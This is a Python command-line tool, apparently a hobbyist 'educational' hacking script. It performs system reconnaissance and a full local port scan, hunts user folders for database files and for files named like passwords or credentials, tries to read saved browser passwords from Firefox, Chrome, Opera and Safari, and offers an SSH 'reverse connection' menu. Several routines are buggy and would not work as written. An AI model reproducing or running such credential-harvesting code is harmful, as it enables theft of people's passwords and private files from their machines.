import os
import socket
import platform
import paramiko
import click

@click.group()
def cli():
    pass


def logo():
    width = os.get_terminal_size().columns
    print("\033[96m" + "_" * int(width/2))
    print ("\033[91m" + """
    * This tool is only for educational purposes 
    * and should not be used for illegal activities, 
    * is not intended to be maliciously used. 
    * Use at your own risk and responsability.
    
    * Author: @GuilhermeCiano
    * Github: https://github.com/Guilherme-Ciano
    """.center(width) + "\x1b[0m")

"""
 Get The principal things going on the machine 
"""
def getSystemInfo():
    #get operating system, user ip, hostname, open ports, etc
    os_name = os.name
    if os_name == 'nt':
        os_name = 'Windows'
    elif os_name == 'posix':
        os_name = 'Linux'
    elif os_name == 'mac':
        os_name = 'Mac'
    else:
        os_name = 'Unknown'

    user_ip = socket.gethostbyname(socket.gethostname())
    hostname = socket.gethostname()
    open_ports = []
    for port in range(1, 65535):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((user_ip, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    
    user_versionOfOperatingSystem = platform.platform()
    user_architecture = platform.machine()
    user_processor = platform.processor()
    user_pythonVersion = platform.python_version()
    user_currentDirectory = os.getcwd()

    
    print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " Operating system: " + "\033[96m" + " " + str(os_name) + "\x1b[0m")
    print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " OS version: " + "\033[96m" + " " + str(user_versionOfOperatingSystem) + "\x1b[0m")
    print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " User architecture: " + "\033[96m" + " " + str(user_architecture) + "\x1b[0m")
    print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " User processor: " + "\033[96m" + " " + str(user_processor) + "\x1b[0m")
    print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " User python version: " + "\033[96m" + " " + str(user_pythonVersion) + "\x1b[0m")
    print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " User IP: " + "\033[96m" + " " + str(user_ip) + "\x1b[0m")
    print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " Open ports: " + "\033[96m" + " " + str(open_ports) + "\x1b[0m")
    print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " Where am I: " + "\033[96m" + " " + str(user_currentDirectory) + "\x1b[0m")
    print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " Hostname: " + "\033[96m" + " " + str(hostname) + "\x1b[0m")
    print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " Who am I: " + "\033[96m" + " " + str(os.popen("whoami").read()) + "\x1b[0m")

    return

def listServicesRunning():
    #get services running on the system
    os_name = os.name
    if os_name == 'nt':
        os_name = 'Windows'
    elif os_name == 'posix':
        os_name = 'Linux'
    elif os_name == 'mac':
        os_name = 'Mac'
    else:
        os_name = 'Unknown'

    if os_name == 'Windows':
        print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " Services running: " + "\033[96m" + " " + str(os.popen("net start").read()))
    elif os_name == 'Linux':
        print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " Services running: " + "\033[96m" + "\n" + str(os.popen("netstat -at -lp -lu").read()))
    elif os_name == 'Mac':
        print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " Services running: " + "\033[96m" + " " + str(os.popen("launchctl list").read()))
    else:
        print('\x1b[6;30;41m' + '[*]' + '\x1b[0m'+ '\033[91m' + ' Error:' + '\033[0m' + ' This OS is not supported')
        return

def sshConnection():
    #create a menu for user to choose the host to connect and add the port and password
    print("\x1b[6;30;42m" + "SSH Connection:" + "\x1b[0m\n")
    print("\x1b[6;30;43m" + "[1]" + "\x1b[0m" + " Connect to a host with a password and a port")
    print("\x1b[6;30;43m" + "[2]" + "\x1b[0m" + " Connect to a host with a port and a key")
    print("\x1b[6;30;43m" + "[0]" + "\x1b[0m" + " Exit")

    ssh_option = input("\n\x1b[6;30;43m" + "[*]" + "\x1b[0m" + " Enter your option: ")
    if ssh_option == '1':
        host = input("\n\x1b[6;30;43m" + "[?]" + "\x1b[0m" + " Enter the host: ")
        port = input("\x1b[6;30;43m" + "[?]" + "\x1b[0m" + " Enter the port: ")
        password = input("\x1b[6;30;43m" + "[?]" + "\x1b[0m" + " Enter the password: ")
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, port, password)
        print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " Connection to " + "\033[96m" + host + ":" + port + "\033[0m" + " with password " + "\033[96m" + password + "\033[0m" + " was successful")
        ssh_client.close()
    elif ssh_option == '2':
        host = input("\n\x1b[6;30;43m" + "[?]" + "\x1b[0m" + " Enter the host: ")
        port = input("\x1b[6;30;43m" + "[?]" + "\x1b[0m" + " Enter the port: ")
        key = input("\x1b[6;30;43m" + "[?]" + "\x1b[0m" + " Enter the key: ")
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, port, key)
        print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + " Connection to " + "\033[96m" + host + ":" + port + "\033[0m" + " with key " + "\033[96m" + key + "\033[0m" + " was successful")
        ssh_client.close()
    elif ssh_option == '0':
        return
    else:
        print('\x1b[6;30;41m' + '[*]' + '\x1b[0m' + '\033[91m' + ' Error:' + '\033[0m' + ' Invalid option')
        sshConnection()

"""
 Search for files with a specific extension or names
"""
def getFilesEndedWith(file_extension):
    #get files with a specific extension in main communs directories, like Desktop, Documents, Downloads, etc based on os
    os_name = os.name
    if os_name == 'nt':
        #search in every directory in the user
        system_path = []
        system_path.append(os.environ.get('USERPROFILE'))
        system_path.append(os.environ.get('desktop'))
        system_path.append(os.environ.get('documents'))
        system_path.append(os.environ.get('downloads'))
        system_path.append(os.environ.get('music'))
        system_path.append(os.environ.get('pictures'))
        system_path.append(os.environ.get('videos'))
    elif os_name == 'posix':
        #search in every directory in /home/user/
        path_desktop = os.path.join(os.environ.get('HOME'), 'Desktop')
        path_documents = os.path.join(os.environ.get('HOME'), 'Documents')
        path_downloads = os.path.join(os.environ.get('HOME'), 'Downloads')
        path_music = os.path.join(os.environ.get('HOME'), 'Music')
        path_pictures = os.path.join(os.environ.get('HOME'), 'Pictures')
        path_videos = os.path.join(os.environ.get('HOME'), 'Videos')

        path_desktop_PtBr = os.path.join(os.environ.get('HOME'), 'Área de Trabalho')
        path_documents_PtBr = os.path.join(os.environ.get('HOME'), 'Documentos')
        path_downloads_PtBr = os.path.join(os.environ.get('HOME'), 'Downloads')
        path_music_PtBr = os.path.join(os.environ.get('HOME'), 'Música')
        path_pictures_PtBr = os.path.join(os.environ.get('HOME'), 'Imagens')
        path_videos_PtBr = os.path.join(os.environ.get('HOME'), 'Vídeos')

        system_path = []
        system_path.append(path_desktop)
        system_path.append(path_documents)
        system_path.append(path_downloads)
        system_path.append(path_music)
        system_path.append(path_pictures)
        system_path.append(path_videos)
        system_path.append(path_desktop_PtBr)
        system_path.append(path_documents_PtBr)
        system_path.append(path_downloads_PtBr)
        system_path.append(path_music_PtBr)
        system_path.append(path_pictures_PtBr)
        system_path.append(path_videos_PtBr)

    elif os_name == 'mac':
        system_path = os.path.join(os.environ.get('HOME'), 'Desktop')
    else:
        print('This OS is not supported')
        return

    #verify if file exists in every path
    files_ended_with = []
    for path in system_path:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.endswith(file_extension):
                        files_ended_with.append(os.path.join(root, file))
    
    if len(files_ended_with) == 0:
        print('\x1b[6;30;41m' + '[*]' + '\x1b[0m' + '\033[91m' + ' Error: ' + '\033[0m' + 'No files found with the extension: ' + "\033[96m" + file_extension)
    else:
        print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + ' Files with the extension: ' + "\033[96m" + file_extension + ' [')
        for file in files_ended_with:
            print("    " + file)
        print("]" + "\x1b[0m")
    
    return files_ended_with

def getFilesByName(file_name):
    #get files with a specific name in main communs directories, like Desktop, Documents, Downloads, etc based on os
    os_name = os.name
    if os_name == 'nt':
        #search in every directory in the user
        system_path = []
        system_path.append(os.environ.get('USERPROFILE'))
        system_path.append(os.environ.get('desktop'))
        system_path.append(os.environ.get('documents'))
        system_path.append(os.environ.get('downloads'))
        system_path.append(os.environ.get('music'))
        system_path.append(os.environ.get('pictures'))
        system_path.append(os.environ.get('videos'))
    elif os_name == 'posix':
        #search in every directory in /home/user/
        path_desktop = os.path.join(os.environ.get('HOME'), 'Desktop')
        path_documents = os.path.join(os.environ.get('HOME'), 'Documents')
        path_downloads = os.path.join(os.environ.get('HOME'), 'Downloads')
        path_music = os.path.join(os.environ.get('HOME'), 'Music')
        path_pictures = os.path.join(os.environ.get('HOME'), 'Pictures')
        path_videos = os.path.join(os.environ.get('HOME'), 'Videos')

        path_desktop_PtBr = os.path.join(os.environ.get('HOME'), 'Área de Trabalho')
        path_documents_PtBr = os.path.join(os.environ.get('HOME'), 'Documentos')
        path_downloads_PtBr = os.path.join(os.environ.get('HOME'), 'Downloads')
        path_music_PtBr = os.path.join(os.environ.get('HOME'), 'Música')
        path_pictures_ptBr = os.path.join(os.environ.get('HOME'), 'Imagens')
        path_videos_PtBr = os.path.join(os.environ.get('HOME'), 'Vídeos')

        system_path = []
        system_path.append(path_desktop)
        system_path.append(path_documents)
        system_path.append(path_downloads)
        system_path.append(path_music)
        system_path.append(path_pictures)
        system_path.append(path_videos)
        system_path.append(path_desktop_PtBr)
        system_path.append(path_documents_PtBr)
        system_path.append(path_downloads_PtBr)
        system_path.append(path_music_PtBr)
        system_path.append(path_pictures_ptBr)
        system_path.append(path_videos_PtBr)

    elif os_name == 'mac':
        system_path = os.path.join(os.environ.get('HOME'), 'Desktop')
    else:
        print('This OS is not supported')
        return

    #verify if file exists in every path
    files_with_name = []
    for path in system_path:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    # if filename == file_name
                    if file_name == file.split('.')[0]:
                        files_with_name.append(os.path.join(root, file))
    
    if len(files_with_name) == 0:
        print('\x1b[6;30;41m' + '[*]' + '\x1b[0m' + '\033[91m' + ' Error: ' + '\033[0m' + 'No files found with the name: ' + "\033[96m" + file_name)
    else:
        print("\x1b[6;30;42m" + "[*]" + "\x1b[0m" + ' Files with the name: ' + "\033[96m" + file_name + ' [')
        for file in files_with_name:
            print("    " + file)
        print("]" + "\x1b[0m")

def searchForDatabasesFiles():
    #Search for databases files in all parts of the system
    databases_files_extensions = ['.db', '.sqlite', '.sqlite3', '.trm', '.dbf', '.mdb', '.sql', '.dbc', '.db3']
    databases_files = []
    for extension in databases_files_extensions:
        databases_files.extend(getFilesEndedWith(extension))
    if len(databases_files) == 0:
        print('\x1b[6;30;41m' + '[*]' + '\x1b[0m' + '\033[91m' + ' Error: ' + '\033[0m' + 'No databases files found')


"""
 Get passwords saved in main browsers
"""
def getStoragedPasswordsFromFirefox():
    # get operating system, then get firefox path from os
    os_name = os.name
    if os_name == 'nt':
        firefox_path = os.path.join(os.environ.get('APPDATA'), 'Mozilla', 'Firefox', 'profiles')
    elif os_name == 'posix':
        firefox_path = os.path.join(os.environ.get('HOME'), '.mozilla', 'firefox', 'profiles')
    elif os_name == 'mac':
        firefox_path = os.path.join(os.environ.get('HOME'), 'Library', 'Application Support', 'Firefox', 'profiles')
    else:
        print('This OS is not supported')
        return
    
    # check if firefox path exists
    if os.path.exists(firefox_path):
        try:
            profiles = os.listdir(firefox_path)
            print ("\x1b[7;33;40m" + "[*]" + "\x1b[0m" +" Found profiles:" + "\033[96m" + " " + str(profiles) + "\x1b[0m")
        except:
            print('\x1b[6;30;41m' + '[*]' + '\x1b[0m'+ '\033[91m' + ' Error:' + '\033[0m' + ' Cannot find Firefox profiles')
            return

        passwords = []
        for profile in profiles:
            profile_path = os.path.join(firefox_path, profile, 'passwordbackups.txt')
            if os.path.exists(profile_path):
                with open(profile_path, 'r') as f:
                    passwords.append(f.read())
                    print(f.read())
        return passwords
    else:
        print('\x1b[6;30;41m' + '[*]' + '\x1b[0m'+ '\033[91m' + ' Error:' + '\033[0m' + ' Cannot find Firefox profiles')
        return

def getStoragedPasswordsFromChrome():
    # get operating system, then get chrome path from os
    os_name = os.name
    if os_name == 'nt':
        chrome_path = os.path.join(os.environ.get('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    elif os_name == 'posix':
        chrome_path = os.path.join(os.environ.get('HOME'), '.config', 'google-chrome', 'Default', 'Login Data')
    elif os_name == 'mac':
        chrome_path = os.path.join(os.environ.get('HOME'), 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'Login Data')
    else:
        print('This OS is not supported')
        return

    # check if chrome path exists
    if os.path.exists(chrome_path):
        try:
            profiles = os.listdir(chrome_path)
            print ("\x1b[7;33;40m" + "[*]" + "\x1b[0m" +" Found profiles:" + "\033[96m" + " " + str(profiles) + "\x1b[0m")
        except:
            print('\x1b[6;30;41m' + '[*]' + '\x1b[0m'+ '\033[91m' + ' Error:' + '\033[0m' + ' Cannot find Chrome profiles')
            return

        passwords = []
        for profile in profiles:
            profile_path = os.path.join(chrome_path, profile, 'Login Data')
            if os.path.exists(profile_path):
                with open(profile_path, 'r') as f:
                    passwords.append(f.read())
                    print(f.read())
        return passwords
    else:
        print('\x1b[6;30;41m' + '[*]' + '\x1b[0m'+ '\033[91m' + ' Error:' + '\033[0m' + ' Cannot find Chrome profiles')
        return

def getStoragedPasswordsFromOpera():
    # get operating system, then get opera path from os
    os_name = os.name
    if os_name == 'nt':
        opera_path = os.path.join(os.environ.get('LOCALAPPDATA'), 'Opera Software', 'Opera Stable', 'Login Data')
    elif os_name == 'posix':
        opera_path = os.path.join(os.environ.get('HOME'), '.config', 'opera', 'Opera Stable', 'Login Data')
    elif os_name == 'mac':
        opera_path = os.path.join(os.environ.get('HOME'), 'Library', 'Application Support', 'Opera Software', 'Opera Stable', 'Login Data')
    else:
        print('This OS is not supported')
        return

    #verify if opera exists
    if os.path.exists(opera_path):
        try:
            profiles = os.listdir(opera_path)
            print ("\x1b[7;33;40m" + "[*]" + "\x1b[0m" +" Found profiles:" + "\033[96m" + " " + str(profiles) + "\x1b[0m")
        except:
            print('\x1b[6;30;41m' + '[*]' + '\x1b[0m'+ '\033[91m' + ' Error:' + '\033[0m' + ' Cannot find Opera profiles')
            return

        passwords = []
        for profile in profiles:
            profile_path = os.path.join(opera_path, profile, 'Login Data')
            if os.path.exists(profile_path):
                with open(profile_path, 'r') as f:
                    passwords.append(f.read())
                    print(f.read())
        return passwords
    else:
        print('\x1b[6;30;41m' + '[*]' + '\x1b[0m'+ '\033[91m' + ' Error:' + '\033[0m' + ' Opera not found')
        return

def getStoragedPasswordsFromSafari():
    # get operating system, then get safari path from os
    os_name = os.name
    if os_name == 'nt':
        safari_path = os.path.join(os.environ.get('LOCALAPPDATA'), 'Apple Computer', 'Safari', 'WebKit', 'Profiles.plist')
    elif os_name == 'posix':
        safari_path = os.path.join(os.environ.get('HOME'), '.config', 'Apple Computer', 'Safari', 'WebKit', 'Profiles.plist')
    elif os_name == 'mac':
        safari_path = os.path.join(os.environ.get('HOME'), 'Library', 'Application Support', 'Apple Computer', 'Safari', 'WebKit', 'Profiles.plist')
    else:
        print('This OS is not supported')
        return

    #verify if safari exists
    if os.path.exists(safari_path):
        try:
            profiles = os.listdir(safari_path)
            print ("\x1b[7;33;40m" + "[*]" + "\x1b[0m" +" Found profiles:" + "\033[96m" + " " + str(profiles) + "\x1b[0m")
        except:
            print('\x1b[6;30;41m' + '[*]' + ' Error:' + '\033[0m' + ' Cannot find Safari profiles')
            return

        passwords = []
        for profile in profiles:
            profile_path = os.path.join(safari_path, profile, 'Web Data')
            if os.path.exists(profile_path):
                with open(profile_path, 'r') as f:
                    passwords.append(f.read())
                    print(f.read())
        return passwords
    else:
        print('\x1b[6;30;41m' + '[*]' + '\x1b[0m'+ '\033[91m' + ' Error:' + '\033[0m' + ' Safari not found')
        return

def browsersView():
    firefox_passwords = getStoragedPasswordsFromFirefox()
    chrome_passwords = getStoragedPasswordsFromChrome()
    opera_passwords = getStoragedPasswordsFromOpera()
    safari_passwords = getStoragedPasswordsFromSafari()

    if firefox_passwords:
        print("\x1b[6;30;42m" + "* Firefox passwords:" + "\x1b[0m" + "\033[96m" + " " + str(firefox_passwords) + "\x1b[0m")
    if chrome_passwords:
        print("\x1b[6;30;42m" + "* Chrome passwords:" + "\x1b[0m" + "\033[96m" + " " + str(chrome_passwords) + "\x1b[0m")
    if opera_passwords:
        print("\x1b[6;30;42m" + "* Opera passwords:" + "\x1b[0m" + "\033[96m" + " " + str(opera_passwords) + "\x1b[0m")
    if safari_passwords:
        print("\x1b[6;30;42m" + "* Safari passwords:" + "\x1b[0m" + "\033[96m" + " " + str(safari_passwords) + "\x1b[0m")
    else:
        print ("\033[91m" + "\n                       * No passwords found! *                  \n" + "\x1b[0m")
        return


"""
 --all -a Complete flag
"""
@click.command(help='Perform a full scan and actions on the machine')
def completeScan():
    logo()
    print('\n\033[96m'+'____________________________= System Info =_________________________'+'\x1b[0m\n')
    getSystemInfo()
    print('\033[96m'+'__________________________= System Services =_______________________'+'\x1b[0m\n')
    listServicesRunning()
    print('\n\033[96m'+'__________________________= Files Founded =_________________________'+'\x1b[0m\n')
    getFilesEndedWith('txt')
    getFilesByName('profile_pic')
    print('\n\033[96m'+'_________________________= Database Files =_________________________'+'\x1b[0m\n')
    searchForDatabasesFiles()
    print('\n\033[96m'+'__________________________= Browsers Pass =_________________________'+'\x1b[0m\n')
    browsersView()

    #ask if want to start a reverse connection
    print('\x1b[6;30;42m' + '[*]' + '\x1b[0m'+ '\033[91m' + ' Do you want to start a reverse connection? (y/n)' + '\x1b[0m')
    answer = input()
    if answer == 'y':
        print('\n\033[96m'+'_________________________= Remote Control =_________________________'+'\x1b[0m\n')
        sshConnection()
    else:
        print('\n\033[96m'+'__________________________= End =_________________________'+'\x1b[0m\n')
        return

"""
 --system -s Only system info
"""
@click.command(help='Retrieve all system info')
def systemScan():
    logo()
    print('\n\033[96m'+'____________________________= System Info =_________________________'+'\x1b[0m\n')
    getSystemInfo()
    print('\033[96m'+'__________________________= System Services =_______________________'+'\x1b[0m\n')
    listServicesRunning()

"""
 --files -f Only files
"""
@click.command(help='Retrieve all files founded with a specific name')
@click.option('--filesName', '-Fn', default='passwords' ,help='Retrieve all files founded', required=True, prompt="Enter the file name: ")
def filesName(filesname):
    logo()
    print('\n\033[96m'+'__________________________= Files Founded =_________________________'+'\x1b[0m\n')
    getFilesByName(filesname)
    print('\n\033[96m'+'_________________________= Database Files =_________________________'+'\x1b[0m\n')
    searchForDatabasesFiles()

@click.command(help='Retrieve all files founded with a specific extension')
@click.option('--filesExt', '-Fe', help='Retrieve all files founded', required=True, prompt="Enter the file extension: ")
def filesExt(filesext):
    logo()
    print('\n\033[96m'+'__________________________= Files Founded =_________________________'+'\x1b[0m\n')
    getFilesEndedWith(filesext)
    print('\n\033[96m'+'_________________________= Database Files =_________________________'+'\x1b[0m\n')
    searchForDatabasesFiles()

"""
 --passwords -p Only passwords
"""
@click.command(help='Retrieve all passwords stored in the machine')
def passwords():
    logo()
    print('\n\033[96m'+'__________________________= Files Founded =_________________________'+'\x1b[0m\n')
    getFilesEndedWith('txt')
    getFilesByName('password')
    getFilesByName('passwords')
    getFilesByName('pass')
    getFilesByName('senha')
    getFilesByName('senhas')
    getFilesByName('codigo')
    getFilesByName('codigos')
    getFilesByName('conta')
    getFilesByName('contas')
    getFilesByName('credencial')
    getFilesByName('credenciais')
    getFilesByName('credencials')
    getFilesByName('credencials')
    getFilesByName('credential')
    getFilesByName('credentials')
    getFilesByName('credential')
    getFilesByName('credentials')
    getFilesByName('credential')
    getFilesByName('credentials')
    getFilesByName('credential')
    getFilesByName('account')
    getFilesByName('accounts')
    print('\n\033[96m'+'__________________________= Browsers Pass =_________________________'+'\x1b[0m\n')
    browsersView()

"""
 --remote -r Only remote control
"""
@click.command(help='Access to remote control pannel')
def remoteSSH():
    logo()
    print('\n\033[96m'+'__________________________= Remote Control =_________________________'+'\x1b[0m\n')
    sshConnection()

cli.add_command(completeScan, name='.Cs')
cli.add_command(systemScan, name='.Ss')
cli.add_command(filesName, name='.Fn')
cli.add_command(filesExt, name='.Fe')
cli.add_command(passwords, name='.Ps')
cli.add_command(remoteSSH, name='.ssh')

if __name__ == '__main__':
    cli()